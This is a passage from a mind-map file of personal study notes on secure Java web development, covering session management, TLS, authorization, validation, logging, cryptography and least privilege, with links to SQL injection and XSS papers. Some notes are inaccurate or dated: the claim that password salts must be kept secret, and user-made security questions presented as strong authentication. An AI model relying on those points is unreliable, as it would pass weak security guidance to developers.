<node CREATED="1395214327935" ID="ID_792875052" MODIFIED="1395214392205" TEXT="Password reset functionality should rely on strong secondary authentication.  e.g. allow users creating their own security questions."/>
<node CREATED="1395214420027" ID="ID_1368525620" MODIFIED="1395214477328" TEXT="do not rely on unreliable factors for authentication such as , ip address ranges, referrer headers"/>
<node CREATED="1395214685819" ID="ID_680133257" MODIFIED="1395214707398" TEXT="use framework supported built-in session mgmt. "/>
<node CREATED="1395214727879" ID="ID_254251720" MODIFIED="1395214764726" TEXT="on log out , session should be invalidated and should be destroyed., Log out link should be presented on all pages."/>
<node CREATED="1395214770339" ID="ID_933855330" MODIFIED="1395214778568" TEXT="enforce session timeout"/>
</node>
</node>
<node CREATED="1395214928809" FOLDED="true" ID="ID_1831429944" MODIFIED="1395229046971" POSITION="right" TEXT="Transaport layer security">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-3"/>
<node CREATED="1395214951026" FOLDED="true" ID="ID_1367252106" MODIFIED="1395229046377" TEXT="common failures">
<node CREATED="1395214955761" ID="ID_1019189496" MODIFIED="1395214967242" TEXT="Poorly implemented SSL"/>
<node CREATED="1395215001738" ID="ID_606330909" MODIFIED="1395215060551" TEXT="application server respond to non-SSL request. note : session id is part of all request responses"/>
</node>
<node CREATED="1395215097455" FOLDED="true" ID="ID_715350769" MODIFIED="1395229036641" TEXT="best practises">
<node CREATED="1395215116252" ID="ID_256977265" MODIFIED="1395215116991" TEXT="All links to sensitive pages or routines in an application should use HTTPS."/>
<node CREATED="1395215125000" ID="ID_752731451" MODIFIED="1395215125812" TEXT="Web servers should be configured to only serve sensitive URLs with HTTPS. "/>
<node CREATED="1395215139004" ID="ID_894988608" MODIFIED="1395215205132">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Cookies used in sensitive sections of the application should have the &quot;secure&quot; attribute set.
    </p>
    <p>
      secure attribute tells browsers not to transmit the cookie over a non-SSL request
    </p>
  </body>
</html></richcontent>
<font ITALIC="true" NAME="SansSerif" SIZE="12"/>
</node>
</node>
</node>
<node CREATED="1395223033753" FOLDED="true" ID="ID_1816433569" MODIFIED="1395294692896" POSITION="right" TEXT="Authorization">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-4"/>
<node CREATED="1395223058983" ID="ID_1733665383" MODIFIED="1395223061019" TEXT="refers to access control, or ensuring that a user is allowed to do what they attempt to do. "/>
<node CREATED="1395223168106" ID="ID_1463638630" MODIFIED="1395223226622">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      It includes
    </p>
    <ul>
      <li>
        &#160;URL access
      </li>
      <li>
        &#160;Post actions
      </li>
      <li>
        &#160;Workflow
      </li>
      <li>
        &#160;Direct Object reference.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node CREATED="1395223229759" FOLDED="true" ID="ID_45847773" MODIFIED="1395294350326" TEXT="solutions include">
<node CREATED="1395223235217" ID="ID_977891707" MODIFIED="1395223307148">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Declarative authorisation is enforced in application configuration , enforced by container.
    </p>
    <p>
      Role based auth.
    </p>
    <ul>
      <li>
        &#160;Users
      </li>
      <li>
        Groups
      </li>
      <li>
        Roles
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node CREATED="1395223315585" ID="ID_1043991475" MODIFIED="1395223330487" TEXT="Programmatic auth in app code only"/>
<node CREATED="1395223388865" FOLDED="true" ID="ID_1489183260" MODIFIED="1395223429745" TEXT="JEE /Struts /Spring supports">
<node CREATED="1395223390898" ID="ID_551707080" MODIFIED="1395223405804">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      &#160;URL authorization in the form of access control lists, configured by the application XML and enforced by the web server.
    </p>
    <p>
      
    </p>
    <p>
      Access control lists associate users with user groups, user groups with privilege sets, and privilege sets with URLs to access. We will cover URL authorization in greater detail when we discuss application configuration and deployment.
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
</node>
<node CREATED="1395224260074" FOLDED="true" ID="ID_50111676" MODIFIED="1395232007897" POSITION="right" TEXT="validation and encoding">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-5"/>
<node CREATED="1395224302052" ID="ID_255853601" MODIFIED="1395224302848" TEXT="practice of assuring the integrity of input from users, other systems or data stores."/>
<node CREATED="1395224328700" FOLDED="true" ID="ID_1124587030" MODIFIED="1395229049105" TEXT="vulnerabilities">
<node CREATED="1395224359201" ID="ID_1673523719" MODIFIED="1395224398638">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        XSS.
      </li>
      <li>
        SQl injection.
      </li>
      <li>
        Buffer overflow.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395224693331" FOLDED="true" ID="ID_236512545" MODIFIED="1395229022788" TEXT="positive validations">
<node CREATED="1395224714853" ID="ID_790414721" MODIFIED="1395224717422" TEXT="means checking to ensure that a given input fits within the confines of what it is supposed to contain."/>
<node CREATED="1395224747048" ID="ID_1785316639" MODIFIED="1395224748170" TEXT="criteria for a given value include length, character sets, patterns, and application-specific business rules."/>
</node>
</node>
<node CREATED="1395232011988" FOLDED="true" ID="ID_331942437" MODIFIED="1395296993478" POSITION="right" TEXT="Exception handling">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-6"/>
<node CREATED="1395232021412" FOLDED="true" ID="ID_704759255" MODIFIED="1395293736377" TEXT="Controlling unhandled exception in java">
<node CREATED="1395232132852" ID="ID_1894075540" MODIFIED="1395232136375">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="ExceptionHandling.jpg" />
  </body>
</html></richcontent>
</node>
</node>
</node>
<node CREATED="1395293675658" FOLDED="true" ID="ID_637536048" MODIFIED="1395295157993" POSITION="right" TEXT="Non-repudiation">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-7"/>
<node CREATED="1395293738505" ID="ID_1560850670" MODIFIED="1395293740787" TEXT="def:">
<node CREATED="1395293744057" ID="ID_1801378637" MODIFIED="1395293744057" TEXT="the ability of a trading partner to prove or disprove having previously sent or received a particular business message to or from another trading partner."/>
</node>
<node CREATED="1395294141760" FOLDED="true" ID="ID_1540216865" MODIFIED="1395294682593" TEXT="techniques">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395294149209" ID="ID_258386695" MODIFIED="1395294407070" TEXT="Application logs">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395294223573" ID="ID_1085170314" MODIFIED="1395294225938">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Proper application audit logs should allow the support team to reconstruct a sequence of events that led to a compromise, error, or outage. In the event of a compromise, audit logs support the investigation as to what vulnerabilities may have allowed the attack.
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395294322935" ID="ID_1858751269" MODIFIED="1395294327647">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      &#160;Insecure logging routines such as a direct text file with no input validation can be vulnerable to injection, allowing an attacker to inject false log entries, corrupt the log file or even inject a premature end-of-file character to prevent users from viewing subsequent entries.
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395294335512" ID="ID_1315924020" MODIFIED="1395294337971">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Computationally expensive logging provides an attacker the opportunity for a denial of service attack, forcing a high volume of logs to overburden the application server's CPU, memory or file system.
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395294412902" ID="ID_354724125" MODIFIED="1395294448243">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      &#160;consider for error logging is to write each occurrence of an application error to the database along with a globally unique identifier, or GUID. Using a strong globally unique identifier allows the application to expose these GUIDs as error codes to users in the event that user needs to contact the support team concerning a failure. An error page with the code will allow a user to provide valuable troubleshooting information
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395294550987" ID="ID_1902720992" MODIFIED="1395294619801" TEXT="seperation of duties: log auditors should be different from dev team or server team. These team are potential insider threat.s"/>
</node>
<node CREATED="1395294160839" ID="ID_938820068" MODIFIED="1395294407800" TEXT="digital signature">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
</node>
</node>
</node>
<node CREATED="1395294684465" FOLDED="true" ID="ID_1808504850" MODIFIED="1395297714994" POSITION="right" TEXT="Data Protection">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-8"/>
<node CREATED="1395295160063" FOLDED="true" ID="ID_976221606" MODIFIED="1395296991468">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      PCI Security Standards
    </p>
  </body>
</html>
</richcontent>
<node CREATED="1395295201487" ID="ID_234278080" MODIFIED="1395295203531">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      provides technical guidance on how credit card data must be handled, when it can be stored, and what protections must be used for stored data.
    </p>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395295372862" FOLDED="true" ID="ID_1255733205" MODIFIED="1395296990998" TEXT="cryptographic algo">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395295385504" FOLDED="true" ID="ID_713115797" MODIFIED="1395296482653" TEXT="Symmetric">
<node CREATED="1395295489520" ID="ID_493650911" MODIFIED="1395295494332">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Symmetric cryptography is often used to protect data at rest inside a system, where only the system itself needs access to the key. Symmetric cryptography is also used to protect data in transit once a key has been securely transferred to both the sender and receiver.
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395296113067" ID="ID_1500508533" MODIFIED="1395296135607">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="SymmetricAlgos.png" />
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395295388556" FOLDED="true" ID="ID_338482413" MODIFIED="1395296342355" TEXT="Asymm ( public key &amp; digital signing )">
<node CREATED="1395296312139" ID="ID_494939050" MODIFIED="1395296314173">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Asymmetric cryptography is often used in situations where data needs to be encrypted in one system, and only needs to be decrypted in another system. For example, an e-commerce application may need to encrypt order data while batched on the e-commerce servers, but then forward that data to other fulfillment systems for further processing. Because the order system has no need to decrypt the previously-encrypted orders, asymmetric cryptography may be an appropriate choice.
    </p>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395295409754" FOLDED="true" ID="ID_528777397" MODIFIED="1395296974432" TEXT="Hash function">
<node CREATED="1395296475787" FOLDED="true" ID="ID_1987691707" MODIFIED="1395296485313" TEXT="def">
<node CREATED="1395296380215" ID="ID_1085602539" MODIFIED="1395296383511">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="HashFunctionpng.png" />
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395296493722" FOLDED="true" ID="ID_1738628329" MODIFIED="1395296497215" TEXT="uses">
<node CREATED="1395296462903" ID="ID_1472906397" MODIFIED="1395296466807">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Hashes are most often used for securely storing data in a database when that data is only used for comparisons. A good example of this is user passwords: there is little reason to store user passwords in plaintext, but they need to be stored for comparison when a user attempts to log in. Hashes are also used to verify that data has not been altered &#8211; small changes in the data cause vastly different hash values, and hashes are generally smaller than the original data, making storage for comparison considerably easier.
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395296548333" ID="ID_56296229" MODIFIED="1395296561319" TEXT="vulnerable to dictionary attacks"/>
<node CREATED="1395296543831" FOLDED="true" ID="ID_274133483" MODIFIED="1395296973812" TEXT="Hash salt">
<node CREATED="1395296611095" ID="ID_646055294" MODIFIED="1395296615019">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      &#160;random &quot;salt&quot; is added to an input prior to hashing. This creates a much larger list of possible inputs to the hash function and increases the required corresponding size of the dictionary. Note that the salt must also be stored alongside the hashed value so that future legitimate comparisons can repeat the process of adding a salt to an input and then hashing. Salting is often used for password storage systems.
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395296619197" ID="ID_634349731" MODIFIED="1395296647997" TEXT="salt must also be kept secret"/>
</node>
</node>
</node>
<node CREATED="1395296975400" ID="ID_307497557" MODIFIED="1395296987994" TEXT="Data protection best parctise">
<node CREATED="1395296996028" ID="ID_1143700331" MODIFIED="1395297011186" TEXT="Create a data classification document"/>
<node CREATED="1395297020144" ID="ID_876525319" MODIFIED="1395297065464" TEXT="Review the information stored in application with classification to identify which fields needs to be encrypted"/>
</node>
<node CREATED="1395297112298" ID="ID_1642987581" MODIFIED="1395297124632" TEXT="java specific best practise">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395297274803" ID="ID_321699806" MODIFIED="1395297281075" TEXT="Java provides a rich set of cryptographic tools via the Java Cryptography Extensions, or JCE."/>
<node CREATED="1395297294335" ID="ID_1512263050" MODIFIED="1395297295407" TEXT="The JCE encompasses the use of encryption ciphers and the creation and management of encryption keys."/>
<node CREATED="1395297338989" ID="ID_1201521965" MODIFIED="1395297339671" TEXT="When the application uses the JCE to load encryption keys from a keystore file, that key is obfuscated in-memory as a safeguard against attackers able to access the data in the Java heap."/>
</node>
</node>
<node CREATED="1395297715842" FOLDED="true" ID="ID_855781744" MODIFIED="1395310802801" POSITION="right" TEXT="configuration and deployment">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-9"/>
<node CREATED="1395297742363" FOLDED="true" ID="ID_226199197" MODIFIED="1395297941445" TEXT="vulnerablities">
<node CREATED="1395297747315" ID="ID_1615501246" MODIFIED="1395297757625" TEXT="Failure to restrict URL"/>
<node CREATED="1395297759033" ID="ID_386136697" MODIFIED="1395297769141" TEXT="Malicious file executionm"/>
<node CREATED="1395297769909" ID="ID_239330193" MODIFIED="1395297776845" TEXT="Denial of service"/>
</node>
<node CREATED="1395297929197" ID="ID_972951990" MODIFIED="1395298056423" TEXT="Handling Least Privileges">
<node CREATED="1395297950065" FOLDED="true" ID="ID_1856341229" MODIFIED="1395298057285" TEXT="Database access">
<node CREATED="1395297993621" ID="ID_1393214411" MODIFIED="1395297995693">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      An application's database account or accounts generally should not be able to modify the actual schema or privileges of database assets. If the application only needs to be able to create or read records from a couple of tables or views, the permissions should reflect exactly that.
    </p>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395298006895" ID="ID_1931004782" MODIFIED="1395298009543">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      &#160;If the application allows some administrative functionality that modifies the database in a manner no other features support, the development team should consider using a separate connection on a separate account for that higher-privileged access.
    </p>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395297957077" ID="ID_984608562" MODIFIED="1395297959613" TEXT="File Access"/>
<node CREATED="1395298059913" FOLDED="true" ID="ID_985352082" MODIFIED="1395298124543" TEXT="in Java ">
<node CREATED="1395298116945" ID="ID_676831229" MODIFIED="1395298121969">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="PrivilegesHandlinJava.png" />
  </body>
</html>
</richcontent>
</node>
</node>
</node>
</node>
<node CREATED="1395310809024" ID="ID_1988621664" MODIFIED="1395310817865" POSITION="left" TEXT="Security IBM training">
<node CREATED="1395310818849" FOLDED="true" ID="ID_631560513" MODIFIED="1395312116188" TEXT="link">
<node CREATED="1395310824474" ID="ID_44093872" MODIFIED="1395310828175">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <table cellpadding="0" border="0" width="800" cellspacing="0">
      <tr>
        <td valign="top">
          <ul>
            <li>
              A good (but long and technical) &quot;story&quot; format of SQL injection (Perl CGI) - &quot;How I Hacked PacketStorm&quot; (RFP, 2001):<a target="_blank" href="http://www.wiretrip.net/rfp/txt/rfp2k01.txt">&#160; http://www.wiretrip.net/rfp/txt/rfp2k01.txt</a><br />
            </li>
            <li>
              A step-by-step tutorial for SQL injection using ODBC error messages: &quot;Web Application Disassembly with ODBC Error Messages&quot; (David Litchfield, 2001):<a target="_blank" href="http://www.nextgenss.com/papers/webappdis.doc"><br />http://www.nextgenss.com/papers/webappdis.doc</a><br />
            </li>
            <li>
              &quot;Advanced SQL Injection In SQL Server Applications&quot; (NGSSecurity, 2002):<a target="_blank" href="http://www.nextgenss.com/papers/advanced_sql_injection.pdf"><br />http://www.nextgenss.com/papers/advanced_sql_injection.pdf </a><br />
            </li>
            <li>
              &quot;Building Secure ASP .NET Applications&quot; (see the section &quot;SQL Injection Attacks&quot;): <a target="_blank" href="http://msdn2.microsoft.com/en-us/library/aa302392.aspx"><br />http://msdn2.microsoft.com/en-us/library/aa302392.aspx</a><br />
            </li>
            <li>
              &quot;Buffer Overflows for Beginners&quot; (NISR Team, 2001):<a target="_blank" href="http://www.nextgenss.com/papers/bufferoverflowpaper.rtf%20"><br />http://www.nextgenss.com/papers/bufferoverflowpaper.rtf </a><br />
            </li>
            <li>
              The basics of XSS are explained in &quot;Cross-Site Scripting Explained&quot; (Sanctum, 2002):<a target="_blank" href="http://crypto.stanford.edu/cs155/CSS.pdf"><br />http://crypto.stanford.edu/cs155/CSS.pdf</a><br />
            </li>
            <li>
              Some more observations about cross-site scripting, as well as a list of examples, are provided in &quot;The Evolution of XSS attacks&quot; (iDefense): <a target="_blank" href="http://www.cgisecurity.com/lib/XSS.pdf%20"><br />http://www.cgisecurity.com/lib/XSS.pdf </a><br />
            </li>
            <li>
              &quot;Security Tips: Defend Your Code with Top Ten Security Tips Every Developer Must Know&quot; (see tip #3 - &quot;Prevent Cross-Site Scripting&quot;):<a target="_blank" href="http://msdn.microsoft.com/msdnmag/issues/02/09/SecurityTips/default.aspx"><br />http://msdn.microsoft.com/msdnmag/issues/02/09/SecurityTips/default.aspx</a><br />
            </li>
            <li>
              &quot;HttpServerUtility.HtmlEncode method&quot; (documentation of the HtmlEncode function):<a target="_blank" href="http://msdn2.microsoft.com/en-us/library/system.web.httpserverutility.htmlencode(vs.71).aspx"><br />http://msdn2.microsoft.com/en-us/library/system.web.httpserverutility.htmlencode(vs.71).aspx</a>
            </li>
          </ul>
        </td>
      </tr>
    </table>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395312117387" ID="ID_1530707907" MODIFIED="1395312119430" TEXT="tool">
<node CREATED="1395312120279" ID="ID_1455574712" MODIFIED="1395312125022" TEXT="paros"/>
</node>
<node CREATED="1395313962799" ID="ID_320634432" MODIFIED="1395313989159" TEXT="AneC cookie editior"/>
</node>
</node>
</map>
